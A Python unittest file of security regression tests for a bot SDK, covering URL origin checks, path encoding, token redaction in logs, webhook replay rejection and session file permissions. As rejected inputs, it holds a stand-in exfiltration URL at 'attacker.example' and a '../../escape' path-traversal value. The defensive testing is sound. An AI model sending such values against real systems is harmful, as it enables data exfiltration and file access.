import json
import os
from pathlib import Path
import stat
import tempfile
import time
import unittest

from botpy.http import Route
from botpy.gateway import _summarize_gateway_message
from botpy.protocol.http import ApiClient
from botpy.protocol.auth import TokenManager
from botpy.protocol.models import SessionState
from botpy.protocol.session import JsonFileSessionStore
from botpy.protocol.transport import WebhookRequest, WebhookTransport, ed25519_sign


class _TokenProvider:
    app_id = "app"

    async def get_access_token(self, force_refresh=False):
        return "token"


class SecurityRegressionTests(unittest.IsolatedAsyncioTestCase):
    async def test_authenticated_absolute_urls_cannot_escape_api_origin(self):
        client = ApiClient(_TokenProvider())

        with self.assertRaises(ValueError):
            await client.get("https://attacker.example/exfiltrate")

        with self.assertRaises(ValueError):
            ApiClient(_TokenProvider(), base_url="https://user:pass@api.example")

        with self.assertRaises(ValueError):
            TokenManager("app", "secret", base_url="https://user:pass@bots.example")


    def test_route_parameters_are_path_encoded(self):
        route = Route("GET", "/users/{openid}", openid="user/with spaces")
        self.assertEqual("/users/user%2Fwith%20spaces", route.formatted_path)

    def test_gateway_debug_summary_redacts_tokens(self):
        summary = _summarize_gateway_message(json.dumps({"op": 2, "d": {"token": "secret-token"}}))
        self.assertNotIn("secret-token", summary)
        self.assertIn("<redacted>", summary)

    async def test_webhook_rejects_replays_and_stale_signatures(self):
        now = time.time()
        body = json.dumps({"op": 0, "d": {}}).encode()
        timestamp = str(int(now))
        signature = ed25519_sign("secret", timestamp.encode() + body)
        transport = WebhookTransport(
            "app",
            "secret",
            clock=lambda: now,
            signature_max_age=300,
        )
        request = WebhookRequest(
            body,
            {
                "x-signature-timestamp": timestamp,
                "x-signature-ed25519": signature,
            },
        )
        self.assertEqual(200, (await transport.handle_request(request)).status)
        self.assertEqual(401, (await transport.handle_request(request)).status)

        old_timestamp = str(int(now - 301))
        old_signature = ed25519_sign("secret", old_timestamp.encode() + body)
        old_request = WebhookRequest(
            body,
            {
                "x-signature-timestamp": old_timestamp,
                "x-signature-ed25519": old_signature,
            },
        )
        self.assertEqual(401, (await transport.handle_request(old_request)).status)

    async def test_session_files_are_owner_only(self):
        with tempfile.TemporaryDirectory() as directory:
            store = JsonFileSessionStore(directory, save_throttle=0)
            await store.save("app", SessionState("session", 1))
            path = next(Path(directory).glob("session-*.json"))
            self.assertEqual(0o600, stat.S_IMODE(os.stat(path).st_mode))
            self.assertEqual(0o700, stat.S_IMODE(os.stat(directory).st_mode))

            with self.assertRaises(ValueError):
                await store.load("app", "../../escape")


if __name__ == "__main__":
    unittest.main()
